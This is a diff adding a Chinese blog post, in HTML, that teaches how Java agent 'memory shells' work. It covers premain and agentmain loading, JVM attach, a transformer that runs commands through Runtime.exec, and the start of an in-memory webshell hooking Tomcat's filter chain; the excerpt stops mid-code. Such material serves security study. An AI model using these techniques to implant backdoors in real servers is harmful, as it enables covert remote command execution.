@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="什么是Java Agent？java agent 是 Java 程序，可以通过在 Java 虚拟机（JVM）启动时提供参数来加载和运行。它可以通过 java.lang.instrument 包提供的 Java 标准接口进行代码插桩（字节码插桩），从而在 Java 应用程序的类加载和运行期间改变 Java 字节码。而java agent内存马就是利用这个特性产生。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识java agent内存马">
+<meta property="og:url" content="http://example.com/2024/01/09/%E5%88%9D%E8%AF%86java-agent%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是Java Agent？java agent 是 Java 程序，可以通过在 Java 虚拟机（JVM）启动时提供参数来加载和运行。它可以通过 java.lang.instrument 包提供的 Java 标准接口进行代码插桩（字节码插桩），从而在 Java 应用程序的类加载和运行期间改变 Java 字节码。而java agent内存马就是利用这个特性产生。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240107203252337.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240107210959049.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240108134056306.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240108215948644.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240109101944849.png">
+<meta property="article:published_time" content="2024-01-09T03:11:59.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:30:44.770Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/image-20240107203252337.png">
+
+<link rel="canonical" href="http://example.com/2024/01/09/%E5%88%9D%E8%AF%86java-agent%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>初识java agent内存马 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/09/%E5%88%9D%E8%AF%86java-agent%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初识java agent内存马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-09 11:11:59" itemprop="dateCreated datePublished" datetime="2024-01-09T11:11:59+08:00">2024-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:30:44" itemprop="dateModified" datetime="2025-05-25T11:30:44+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="什么是Java-Agent？"><a href="#什么是Java-Agent？" class="headerlink" title="什么是Java Agent？"></a>什么是Java Agent？</h2><p>java agent 是 Java 程序，可以通过在 Java 虚拟机（JVM）启动时提供参数来加载和运行。它可以通过 java.lang.instrument 包提供的 Java 标准接口进行<strong>代码插桩（字节码插桩）</strong>，从而在 Java 应用程序的类加载和运行期间改变 Java 字节码。而java agent内存马就是利用这个特性产生。</p>
+<span id="more"></span>
+
+<h2 id="Java-Agent启动方式"><a href="#Java-Agent启动方式" class="headerlink" title="Java Agent启动方式"></a>Java Agent启动方式</h2><ol>
+<li>实现premain方法（JVM启动前加载）</li>
+<li>实现agentmain方法（JVM启动后加载）</li>
+</ol>
+<p>Java Agent 只是一个 Java 类而已，只不过普通的 Java 类是以 main 函数作为入口点的，Java Agent 的入口点则是 premain 和 agentmain</p>
+<h4 id="实现premain方法（JVM启动前加载）"><a href="#实现premain方法（JVM启动前加载）" class="headerlink" title="实现premain方法（JVM启动前加载）"></a>实现premain方法（JVM启动前加载）</h4><p>举一个简单的例子</p>
+<p>先创建一个DemoTest类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line">public class DemoTest &#123;</span><br><span class="line">    public static void premain(String agentArgs, Instrumentation inst) throws Exception&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        System.out.println(&quot;ycxlo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后定义一个清单文件DemoTest.Mf（注意多一个换行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: </span><br></pre></td></tr></table></figure>
+
+<p>使用javac对DemoTest文件进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac DemoTest.java</span><br></pre></td></tr></table></figure>
+
+<p>使用jar进行打包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar DemoTest.mf DemoTest.class</span><br></pre></td></tr></table></figure>
+
+<p>我们接下来再创建一个普通的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Hello &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;hi,world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样创建一个hello.mf的清单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: Hello</span><br></pre></td></tr></table></figure>
+
+<p>使用jar进行打包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm hello.jar hello.mf Hello.class</span><br></pre></td></tr></table></figure>
+
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar=args -jar hello.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240107203252337.png" alt="image-20240107203252337"></p>
+<p>可以看到premain方法在main方法之前执行，这里的123就是形参agentArgs</p>
+<p>也可以将这种启动方式称为<strong>命令行启动方式</strong></p>
+<h4 id="加载agentmain方法"><a href="#加载agentmain方法" class="headerlink" title="加载agentmain方法"></a>加载agentmain方法</h4><p>在实现agentmain之前有必要介绍一下几个组件：</p>
+<p>1、Instrumentation API：</p>
+<p>Instrumentation API 是一个 Java 类库，提供了一组用于在 Java 应用程序运行时进行字节码操作的接口。</p>
+<p>它包括如下接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassDefinition：表示要定义的类的字节码。</span><br><span class="line">ClassFileTransformer：提供了将输入的字节码转换为输出字节码的方法。</span><br><span class="line">Instrumentation：提供了大多数代理功能的主接口。</span><br><span class="line">UnmodifiableClassException：表示尝试修改不能修改的类时抛出的异常。</span><br></pre></td></tr></table></figure>
+
+<p>通常，<strong>使用 Instrumentation API 可以在不重新启动应用程序的情况下修改类的字节码</strong>，并在运行时监控和测量应用程序的性能。它还可以用于创建 Java Agent，这是一种在 Java 程序启动时通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0&spm=1001.2101.3001.7020">命令行参数</a>指定的程序，可以替代或修改类的字节码。</p>
+<p>2、VirtualMachine</p>
+<p>VirtualMachine是Java提供的一种用于动态加载Java类的机制，是Java虚拟机的一部分，可以通过它在运行时加载和执行Java类。VirtualMachine接口定义了一些用于在虚拟机内部操作的方法，包括加载类、执行方法、获取类信息和设置虚拟机属性等。</p>
+<p>VirtualMachine常用的接口为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">attach(String id)：连接到具有指定ID的Java虚拟机。</span><br><span class="line">detach()：从Java虚拟机断开连接。</span><br><span class="line">loadAgent(String agent)：将指定的Java Agent加载到Java虚拟机中。</span><br><span class="line">loadAgentLibrary(String agentLibrary)：将指定的库加载到Java虚拟机中。</span><br><span class="line">loadAgentPath(String agentPath)：将指定的路径加载到Java虚拟机中。</span><br><span class="line">getSystemProperties()：获取Java虚拟机的系统属性。</span><br><span class="line">getAgentProperties()：获取Java Agent的属性。</span><br><span class="line">getClassPath()：获取Java虚拟机的类路径。</span><br><span class="line">getJvmArgs()：获取Java虚拟机的JVM参数。</span><br><span class="line">getInputArguments()：获取Java虚拟机的输入参数。</span><br><span class="line">getAllThreads()：获取Java虚拟机中所有线程的信息。</span><br><span class="line">getCapabilities()：获取Java虚拟机的能力。</span><br></pre></td></tr></table></figure>
+
+<p>举一个简单的例子</p>
+<p>编写一个实现了ClassFileTransformer接口的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.instrument.ClassFileTransformer;</span><br><span class="line">import java.lang.instrument.IllegalClassFormatException;</span><br><span class="line">import java.security.ProtectionDomain;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"> </span><br><span class="line">public class DefineTransformer implements ClassFileTransformer &#123;</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;</span><br><span class="line">        Scanner sc = new Scanner(System.in);</span><br><span class="line">        System.out.println(&quot;Injected Class AgentMainDemo Successfully !&quot;);</span><br><span class="line">        System.out.print(&quot;&gt; &quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            InputStream is = Runtime.getRuntime().exec(sc.next()).getInputStream();</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">            String line;</span><br><span class="line">            StringBuilder sb = new StringBuilder();</span><br><span class="line">            while ((line = br.readLine()) != null)</span><br><span class="line">            &#123;</span><br><span class="line">                sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>transform()</code>*<em>方法会在 JVM 加载类文件时被调用。具体来说，当 JVM 加载一个类时，它会先将类文件的*<em>字节码读入内存</em></em>，然后将字节码</strong>传递给已注册的类转换器**（即实现了<code>ClassFileTransformer</code>接口的类），让转换器对其进行修改。</p>
+<p>调用该类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line">public class AgentMain &#123;</span><br><span class="line">    public static void agentmain(String agentArgs, Instrumentation ins) &#123;</span><br><span class="line">        ins.addTransformer(new DefineTransformer(),true);//注册一个Class文件的转换器</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编写清单文件AgentMain.Mf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: AgentMain</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Agent-Class</strong>: 如果实现支持在VM启动后某个时间启动代理的机制，则此属性指定代理类。也就是说，包含agentmain方法的类。这个属性是必需的，如果没有它，代理将不会启动。注意:这是一个类名，而不是文件名或路径。</li>
+<li><strong>Can-Redefine-Classes</strong>: 布尔值(true或false，与大小写无关)。是重新定义此代理所需的类的能力。除true以外的值被认为是false。该属性是可选的，默认为false。</li>
+<li><strong>Can-Retransform-Classes</strong>: 布尔值(真或假，与大小写无关)。是重新转换此代理所需的类的能力。除true以外的值被认为是false。该属性是可选的，默认为false。</li>
+</ul>
+<p>对其进行编译打包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm AgentMain.jar AgentMain.Mf AgentMain.class DefineTransformer.class</span><br></pre></td></tr></table></figure>
+
+<p>最后创建一个利用类（正在运行的application）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.tools.attach.VirtualMachine;</span><br><span class="line">import com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line">import java.util.List;</span><br><span class="line">public class maindemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        String path = &quot;D:\\java_agent\\src\\main\\java\\AgentMain.jar&quot;;</span><br><span class="line"></span><br><span class="line">        // 列出已加载的jvm</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        // 遍历已加载的jvm</span><br><span class="line">        for (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line"> </span><br><span class="line">            // 打印jvm的 displayName 属性</span><br><span class="line">            System.out.println(&quot;+++++++++++++++++++++++++&quot;);</span><br><span class="line">            System.out.println(v.displayName());</span><br><span class="line">            System.out.println(&quot;+++++++++++++++++++++++++&quot;);</span><br><span class="line">            // 如果 displayName 为指定的类</span><br><span class="line">            if (v.displayName().contains(&quot;maindemo&quot;))&#123;</span><br><span class="line">                // 打印pid</span><br><span class="line">                System.out.println(&quot;id &gt;&gt;&gt; &quot; + v.id());</span><br><span class="line">                // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接</span><br><span class="line">                VirtualMachine vm = VirtualMachine.attach(v.id());</span><br><span class="line">                // 将我们的 AgentMain.jar 发送给虚拟机</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                // 解除链接</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>VirtualMachine</strong>代表一个 Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了 <strong>JVM 枚举</strong>，<strong>Attach</strong>动作和 <strong>Detach</strong>动作（Attach 动作的相反行为，从 JVM 上面解除一个代理）等等</p>
+<p>将其编译后在命令行运行</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240107210959049.png" alt="image-20240107210959049"></p>
+<p>这样我们就将AgentMain类注入到了maindemo中</p>
+<p>这种启动方式也叫做Attach机制启动</p>
+<p>3、Javassist</p>
+<p>Javassist是一个Java库，用于在运行时操作字节码。 它提供了一种简单的方法来创建新类，修改现有类和动态加载类。 Javassist还提供了用于分析和修改Java字节码的API，以及用于在运行时修改Java类的能力。 Javassist使用类似于Java的语法来操作字节码，使得它很容易学习和使用。ClassPool：</p>
+<p>ClassPool是Javassist的类池，主要用于管理和操作字节码，可以加载.class文件或者是CtClass对象并进行转换。</p>
+<p>CtClass是javassist中的一个类文件，它的对象可以理解成一个class文件的抽象表示。一个CtClass对象可以用来修改一个class文件。</p>
+<p>常用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getDefault(): 获取默认的ClassPool对象。</span><br><span class="line">insertClassPath(ClassPath cp): 插入类源路径。</span><br><span class="line">get(String className): 通过类名获取CtClass对象。</span><br><span class="line">makeClass(String className): 创建新的CtClass对象。</span><br><span class="line">makeInterface(String className): 创建新的接口CtClass对象。</span><br><span class="line">makeAnnotation(String className): 创建新的注解CtClass对象。</span><br></pre></td></tr></table></figure>
+
+<p>简单的测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import javassist.*;</span><br><span class="line">public class javassist</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        // 获取ClassPool对象</span><br><span class="line">        ClassPool pool = new ClassPool(true);</span><br><span class="line">        // 插入类源路径</span><br><span class="line">        pool.insertClassPath(new LoaderClassPath(javassist.class.getClassLoader()));</span><br><span class="line">        // 新增Class</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;ssist.Test&quot;);</span><br><span class="line">        // 新增Interface</span><br><span class="line">        ctClass.addInterface(pool.get(Test.class.getName()));</span><br><span class="line">        // 要添加的方法的返回值类型</span><br><span class="line">        CtClass type = pool.get(void.class.getName());</span><br><span class="line">        // 方法名称</span><br><span class="line">        String name = &quot;SayHello&quot;;</span><br><span class="line">        // 方法参数</span><br><span class="line">        CtClass[] parameters = new CtClass[]&#123;pool.get(String.class.getName())&#125;;</span><br><span class="line">        // 方法体，$1是方法的第一个参数</span><br><span class="line">        String body = &quot;&#123;&quot; +</span><br><span class="line">                &quot;System.out.println(\&quot;Hello \&quot; + $1);&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        // 实现方法</span><br><span class="line">        CtMethod ctMethod = new CtMethod(type, name, parameters, ctClass);</span><br><span class="line">        // 设置方法体</span><br><span class="line">        ctMethod.setBody(body);</span><br><span class="line">        //添加方法</span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line">        //调用</span><br><span class="line">        Test o = (Test) ctClass.toClass().newInstance();</span><br><span class="line">        o.SayHello(&quot;ycxlo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 添加Test接口以便于Class的获取等一系列操作</span><br><span class="line">    public interface Test</span><br><span class="line">    &#123;</span><br><span class="line">        public void SayHello(String str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240108134056306.png" alt="image-20240108134056306"></p>
+<h2 id="初步实现内存马"><a href="#初步实现内存马" class="headerlink" title="初步实现内存马"></a>初步实现内存马</h2><p>由于实际环境中我们通常遇到的都是已经启动着的，所以 premain 那种方法不合适内存马注入，所以我们这里利用 agentmain 方法来尝试注入我们的内存马</p>
+<p>主要用到的类和方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.ApplicationFilterChain#doFilter</span><br></pre></td></tr></table></figure>
+
+<p>选用这个方法的主要原因是：它封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回，并且不会影响正常的业务逻辑。</p>
+<p>我们将构造流程分为三步</p>
+<ul>
+<li>构造application（一个受害者web应用，我将使用Springboot框架搭建）</li>
+<li>编写Agent（包括AgentMain和Transformer），在Transformer中修改目标类字节码</li>
+<li>编写Attach（将agent加载到application中）</li>
+</ul>
+<p>1、构造application</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.test.springbootdemmo.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class VulnController &#123;</span><br><span class="line">    @ResponseBody</span><br><span class="line">    @RequestMapping(&quot;/vuln&quot;)</span><br><span class="line">    public String cc11Vuln()&#123;</span><br><span class="line">        return &quot;Hello World&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、编写agent</p>
+<p>我们先定义一个Transformer,在其中使用javassist的 insertBefore将恶意代码插入到前面，从而减少对原程序的功能破坏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package Transformer;</span><br><span class="line"></span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line"></span><br><span class="line">import java.lang.instrument.ClassFileTransformer;</span><br><span class="line">import java.lang.instrument.IllegalClassFormatException;</span><br><span class="line">import java.security.ProtectionDomain;</span><br><span 